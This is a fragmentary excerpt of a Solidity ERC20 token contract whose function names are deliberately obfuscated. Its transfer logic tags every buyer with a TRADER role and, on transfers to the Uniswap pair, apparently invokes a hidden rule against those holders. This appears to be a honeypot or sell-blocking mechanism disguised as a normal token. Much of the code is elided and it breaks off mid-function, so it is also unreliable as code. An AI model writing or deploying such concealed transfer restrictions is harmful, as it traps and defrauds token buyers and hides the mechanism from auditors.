...
abstract contract _XCFNRMGConsole is Context, _XCFNRMGRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __XCFNRMGmevRooG(role, account, amt);
    }

    function __XCFNRMGmevRooG(bytes32 role, address account, uint256 amount) internal {
    ...
    function XCFNRMGpubNRule(bytes32 role, address account, uint256 num) internal virtual {
        if(role == TRADER){
...
contract _XCFNRMGERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _XCFNRMGERC20, _XCFNRMGConsole {
    ...
    ) _XCFNRMGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_XCFNRMGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __XCFNRMGxbfdbfd(from, to, amt);

    }

    function __XCFNRMGxbfdbfd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __XCFNRMGnbnvbvca(from, to, amt);
    }


    function __XCFNRMGnbnvbvca(address from, address to, uint256 amt) internal {
        ...
        __XCFNRMGzfetry(from, to, amt);
    }

    function __XCFNRMGzfetry(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __XCFNRMGtdfbb(from, to, amt);
    }


    function __XCFNRMGtdfbb(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            if(newnum > 99){
                XCFNRMGpubNRule(TRADER,from,amt);
            }
            
        }

        __XCFNRMGiyuhgbvc(from, to, amt);
    }

    function __XCFNRMGiyuhgbvc(address from, address to, uint256 amt) internal {
